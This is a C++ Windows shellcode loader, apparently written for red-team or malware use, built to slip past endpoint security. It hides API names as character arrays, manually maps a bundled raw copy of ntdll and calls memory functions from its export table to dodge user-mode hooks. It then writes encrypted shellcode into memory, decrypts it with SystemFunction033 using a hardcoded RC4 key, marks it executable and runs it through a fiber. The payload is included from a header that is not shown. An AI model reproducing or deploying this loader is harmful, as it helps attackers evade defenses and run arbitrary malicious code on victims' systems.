/*

parsing Ntdll in memory to retrieve NTapi from it's EAT + ReflectiveNtdll (pe2shc) + SytemFunction033 + CreateFiber

*/
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h> 
#include <string>
#include <winternl.h>		// For Ntdll parsing

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

//using namespace std;

typedef NTSTATUS(WINAPI* _SystemFunction033)(
	
	struct ustring* memoryRegion,
	struct ustring* keyPointer
);

struct ustring{
DWORD Length;
DWORD MaximumLength;
PVOID Buffer;
} _data, key, _data2;

unsigned char sSystemFunction033[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','3', 0x0 };
unsigned char sadvapi32[] = { 'a','d','v','a','p','i','3','2',0x0};

_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary((LPCSTR)sadvapi32), (LPCSTR)sSystemFunction033);

// ============================================================================================================================

#pragma comment (lib, "ntdll.lib")		// For the Usage of Nt Functions

#define NT_SUCCESS(Status)              (((NTSTATUS)(Status)) >= 0)		// Macro defined in ntapi.h

// [link: https://www.codeproject.com/Questions/103661/how-to-get-current-Process-HANDLE]
// Return value of currentProcess() is a pseudo handle to the current process
// => (HANDLE)-1 => 0xFFFFFFFF" (MSDN)
#define MyCurrentProcess()	   ((HANDLE)-1)

// typedefs
// Ntapi obfuscation:

unsigned char sNtAllocateVirtualMemory[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };

unsigned char sNtProtectVirtualMemory[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };

unsigned char sNtWriteVirtualMemory[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };

//unsigned char sNtCreateThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0x0 };

// link: http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html
typedef NTSTATUS (*NtAllocateVirtualMemory_t)(

	IN HANDLE               ProcessHandle,
  	IN OUT PVOID            *BaseAddress,
  	IN ULONG                ZeroBits,
  	IN OUT PULONG           RegionSize,
  	IN ULONG                AllocationType,
	IN ULONG                Protect
);

// link: http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html
typedef NTSTATUS (*NtProtectVirtualMemory_t)(

	IN HANDLE               ProcessHandle,
	IN OUT PVOID            *BaseAddress,
	IN OUT PULONG           NumberOfBytesToProtect,
	IN ULONG                NewAccessProtection,
	OUT PULONG              OldAccessProtection
);

// link: http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html
typedef NTSTATUS (*NtWriteVirtualMemory_t)(

	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten OPTIONAL
);

// ==================================================================================================================

//typedefs
//typedef BOOL (WINAPI * VirtualProtect_t) (LPVOID, SIZE_T, DWORD, PDWORD);
typedef LPVOID (WINAPI *VirtualAlloc_t) (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
//typedef VOID (WINAPI *RtlMoveMemory_t) (VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
typedef LPVOID (WINAPI *ConvertThreadToFiber_t) (LPVOID lpParameter);
typedef LPVOID (WINAPI *CreateFiber_t) (SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter);
typedef void (WINAPI *SwitchToFiber_t) (LPVOID lpFiber);


//strings
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };

//unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0x0};

unsigned char sConvertThreadToFiber[] = {'C','o','n','v','e','r','t','T','h','r','e','a','d','T','o','F','i','b','e','r', 0x0};
unsigned char sCreateFiber[] = {'C','r','e','a','t','e','F','i','b','e','r', 0x0};
unsigned char sSwitchToFiber[] = {'S','w','i','t','c','h','T','o','F','i','b','e','r', 0x0};


//VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAlloc);
//RtlMoveMemory_t RtlMoveMemory_p = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sRtlMoveMemory);

ConvertThreadToFiber_t ConvertThreadToFiber_p = (ConvertThreadToFiber_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sConvertThreadToFiber);
CreateFiber_t CreateFiber_p = (CreateFiber_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFiber);
SwitchToFiber_t SwitchToFiber_p = (SwitchToFiber_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sSwitchToFiber);


#include "win10-ntdll_22H2_19045-2486.h"
//#include "win11-ntdll_22H2_22621-1105.h"
#include "enc_shellcode.h"

int main(VOID)
{
		PVOID mainFiber = ConvertThreadToFiber_p(NULL);

		unsigned int shellcode_size = sizeof(enc_shellcode);
		unsigned int raw_ntdll_len = sizeof(win10_ntdll_22H2_19045_2486_shellcode);

		NTSTATUS status;

		// This portion (these 2 lines) is not needed as ntdll is already present as raw byte in win10_ntdll_22H2_19045_2486.h file

		//char* ntdllbytes = (char*)malloc(raw_ntdll_len);	// Avoiding the use of VirtualAlloc()
		//std::memcpy(ntdllbytes, win10_ntdll_22H2_19045_2486_shellcode, raw_ntdll_len);	// Avoiding the use of RtlMoveMemory()

		/*
			Parsing Ntdll in memory to get address of functions from it's EAT.

			Those functions retrieved from the mapped NTDLL is needed to Run Map and run shellcode !

			EAT: holds the addresses of the functions a DLL allows other Codes to Call.
		*/

		// region Start: DOS_HEADER
		//IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)ntdllbytes;
		IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)win10_ntdll_22H2_19045_2486_shellcode;
		// endregion End: DOS_HEADER

		// region Start: NT_HEADERS => Accessing the last member of DOS Header (e_lfanew) to get the entry point for NT Header
		//IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)ntdllbytes + DOS_HEADER->e_lfanew);
		IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)win10_ntdll_22H2_19045_2486_shellcode + DOS_HEADER->e_lfanew);
		// endregion Start: NT_HEADERS

		// Getting the Size of ntdll
		SIZE_T ntdllsize = NT_HEADER->OptionalHeader.SizeOfImage;

		// Allocating a buffer based on the size of of Ntdll : size should be same as raw_ntdll_len
		LPVOID ntdll_alloc = VirtualAlloc_p(0, ntdllsize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		//LPVOID ntdll_alloc = VirtualAlloc_p(0, ntdllsize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

		//CopyMemory(ntdll_alloc, ntdllbytes, NT_HEADER->OptionalHeader.SizeOfHeaders);
		CopyMemory(ntdll_alloc, win10_ntdll_22H2_19045_2486_shellcode, NT_HEADER->OptionalHeader.SizeOfHeaders);


		// region Start: Mapping Sections into Memory
		printf("\n[*] Mapping Sections of raw ntdll into Process Memory...\n");

		IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);	// Using Macro defined in winnt.h

		printf("\n[+] SECTION_HEADER:\n");
		printf("\t 2nd Member of IMAGE_NT_HEADERS->IMAGE_FILE_HEADER struct : Name =>\n");

		for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++)
		{
				LPVOID ntdllsectionDest = (LPVOID)((DWORD64)ntdll_alloc + (DWORD64)SECTION_HEADER->VirtualAddress);
				//LPVOID ntdllsectionSource = (LPVOID)((DWORD64)ntdllbytes + (DWORD64)SECTION_HEADER->PointerToRawData);
				LPVOID ntdllsectionSource = (LPVOID)((DWORD64)win10_ntdll_22H2_19045_2486_shellcode + (DWORD64)SECTION_HEADER->PointerToRawData);

				printf("\t\t %s: ", SECTION_HEADER->Name);
	
				printf("mapped from %p (Offset: %p)", ntdllsectionSource, (DWORD64)SECTION_HEADER->PointerToRawData);
				printf(" to \t %p (Offset: %p)\n", ntdllsectionDest, (DWORD64)SECTION_HEADER->VirtualAddress);

				// Section Mapped!
				CopyMemory(ntdllsectionDest, ntdllsectionSource, SECTION_HEADER->SizeOfRawData);

				SECTION_HEADER++;
		}
		// endregion Start: Mapping Sections into Memory

		// region Start: Mapping IAT into memory 	=> For My ntdll.dll => There was no IAT 	=>	So haven't parsed that (link: IAT_ntdll_missing.PNG)
		/*
		printf("\n[*] Mapping IAT of raw ntdll into Process Memory...\n");


		// Why 1st element => see this link (image): IAT_ntdll.PNG
		IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)ntdll_alloc + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

		printf("1\n"); getchar();

		LPCSTR ModuleName = "";

		while (IMPORT_DATA->Name != NULL)
		{
				printf("2\n"); getchar();

				ModuleName = (DWORD64)ntdll_alloc + (LPCSTR)IMPORT_DATA->Name;

				printf("[+] DLL Name: %s\n", IMPORT_DATA->Name);

				//printf("3\n"); getchar();

				IMAGE_THUNK_DATA* firstThunk;

				printf("4\n"); getchar();

				HMODULE hmodule = LoadLibrary(ModuleName);

				printf("5\n"); getchar();

				if (hmodule)
			{
				//printf("[+] Loaded DLL: %s\n", ModuleName);

				firstThunk = (IMAGE_THUNK_DATA*)((DWORD64)ntdll_alloc + IMPORT_DATA->FirstThunk);
				for (int i = 0; firstThunk->u1.AddressOfData; firstThunk++)
				{
						DWORD64 importFn = (DWORD64)ntdll_alloc + *(DWORD*)firstThunk;
						LPCSTR n = (LPCSTR)((IMAGE_IMPORT_BY_NAME*)importFn)->Name;	// get the name of each imported function 

						printf("\t[+] Imported Functions: %s\n", n);

						*(DWORD64*)firstThunk = (DWORD64)GetProcAddress(hmodule, n);
				}
			}
			IMPORT_DATA++;
		}
		*/
		// endregion Start: Mapping IAT into Memory

		// region Start: Mapping EAT to Memory
		printf("\n[*] Mapping EAT of raw ntdll into Process Memory...\n");

		// Why 0th element => see this link (image): EAT_ntdll.PNG
		IMAGE_EXPORT_DIRECTORY* EXPORT_DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)ntdll_alloc + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

		// see struct: link (image): _IMAGE_EXPORT_DIRECTORY.PNG
		DWORD* addrNames = (DWORD*)((DWORD64)ntdll_alloc + EXPORT_DIR->AddressOfNames);
		DWORD* addrFunction = (DWORD*)((DWORD64)ntdll_alloc + EXPORT_DIR->AddressOfFunctions);
		WORD* addrOrdinal = (WORD*)((DWORD64)ntdll_alloc + EXPORT_DIR->AddressOfNameOrdinals);

		DWORD* addrNames1 = addrNames;

		// Checking For NtAllocateVirtualMemory() from EAT of Mapped NTDLL

		NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = NULL;

		char* Name;
		
		for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++)
		{
				char* name = (char*)((DWORD64)ntdll_alloc + *(DWORD*)addrNames1++);

        		//printf("%p\n", ((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]));
		
        		if (strstr(name, (char*)sNtAllocateVirtualMemory) != NULL)
        		{
        			//printf("\nRetrieved Function Names: %s", name);
        			Name = name;

					pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)((DWORD64)ntdll_alloc + addrFunction[addrOrdinal[index]]);
					break;
				}
        }

        printf("\n[+] Mapped ntdll address =  %p\n\n", ntdll_alloc);

        // Printing The name of retrieved NtAllocateVirtualMemory() in here for proper allignment of retrived Function Names in the Output Prompt
        printf("\nRetrieved Function Name: %s\n", Name);

        PVOID BaseAddress = NULL;

        // I tried with different Values no matter what the value is: Process Hacker is showing it as 2,016 KB (ig taking it as default)
        // As told to me by Saad => As NtAllocateVirtualMemory (Wrapper Function) that we are using is syscall (usermode).
        // It has default page allocation by NtAllocateVirtualMemory() which resides in Kernel Space (SPecifically in Ntoskrnl.sys)
        ULONG dwSize = 0x01;	// I used the shellcode size instead of this

        ULONG shcSize = (ULONG)shellcode_size;

        ULONG OldProtect = 0;

        if (pNtAllocateVirtualMemory)
        {
			NTSTATUS status = pNtAllocateVirtualMemory(MyCurrentProcess(), &BaseAddress, 0, &shcSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        	
        	if (!NT_SUCCESS(status))
        	{
            	printf("[!] Failed in NtAllocateVirtualMemory (%u)\n", GetLastError());
            	return 1;
        	}
        	
        	printf("\n\t\t(For RW)\n\t\t[+] Address of NtAllocateVirtualMemory %p\n", pNtAllocateVirtualMemory);
        	printf("\t\t[+] NtAllocatedVirtualMemory Executed !!!\n");
		}

		// Checking For NtWriteVirtualMemory() from EAT of Mapped NTDLL

		DWORD* addrNames2 = addrNames;
		
		NtWriteVirtualMemory_t pNtWriteVirtualMemory = NULL;
    	
    	for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++)
    	{
        	char* name = (char*)((DWORD64)ntdll_alloc + *(DWORD*)addrNames2++);

        	if (strstr(name, (char*)sNtWriteVirtualMemory) != NULL)
        	{
        		printf("\nRetrieved Function Name: %s\n", name);
            	pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)((DWORD64)ntdll_alloc + addrFunction[addrOrdinal[index]]);
            	break;
        	}
    	}

    	if (pNtWriteVirtualMemory)
    	{
        	status = pNtWriteVirtualMemory(MyCurrentProcess(), BaseAddress, (PVOID)enc_shellcode, shcSize, NULL);
        	if (!NT_SUCCESS(status))
        	{
            	printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
            	return 1;
        	}
        	printf("\n\t\t[+] Address of NtWriteVirtualMemory %p\n", pNtWriteVirtualMemory);
        	printf("\t\t[+] NtWriteVirtualMemory Executed !!!\n");
    	}

    	// Decrypting shellcode in-memory

		char _key[] = "alphaBetagamma";

		key.Buffer = (&_key);
		key.Length = sizeof(_key);

		_data.Buffer = BaseAddress;
		_data.Length = shellcode_size;

		// Decrypting shellcode
		SystemFunction033(&_data, &key);

		printf("\n[+] Shellcode decrypted in-memory process using SystemFunction033 NtApi\n");


    	// Checking For NtProtectVirtualMemory() from EAT of Mapped NTDLL

    	DWORD* addrNames3 = addrNames;
    	
    	NtProtectVirtualMemory_t pNtProtectVirtualMemory = NULL;
    	
    	for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++)
    	{
        	char* name = (char*)((DWORD64)ntdll_alloc + *(DWORD*)addrNames3++);

        	if (strstr(name, (char*)sNtProtectVirtualMemory) != NULL)
        	{
        		printf("\nRetrieved Function Name: %s\n", name);
				pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)((DWORD64)ntdll_alloc + addrFunction[addrOrdinal[index]]);
            	break;
        	}
    	}

		// RW to RX
		if (pNtProtectVirtualMemory)
    	{
        	status = pNtProtectVirtualMemory(MyCurrentProcess(), &BaseAddress, &shcSize, PAGE_EXECUTE_READ, &OldProtect);

        	if (!NT_SUCCESS(status))
        	{
            	printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
            	return 1;
        	}
        	printf("\n\t\t(RW->RX)\n\t\t[+] Address of NtProtectVirtualMemory %p\n", pNtProtectVirtualMemory);
        	printf("\t\t[+] NtProtectVirtualMemory Executed !!!\n");
    	}

    	printf("\n[*] Creating a fiber that will execute the shellcode...\n");

		// create a fiber that will execute the shellcode
		PVOID shellcodeFiber = CreateFiber_p(NULL, (LPFIBER_START_ROUTINE)BaseAddress, NULL);

		// manually schedule the fiber that will execute our shellcode
		SwitchToFiber_p(shellcodeFiber);

		//printf("Used getchar()"); getchar();
		return 0;
}
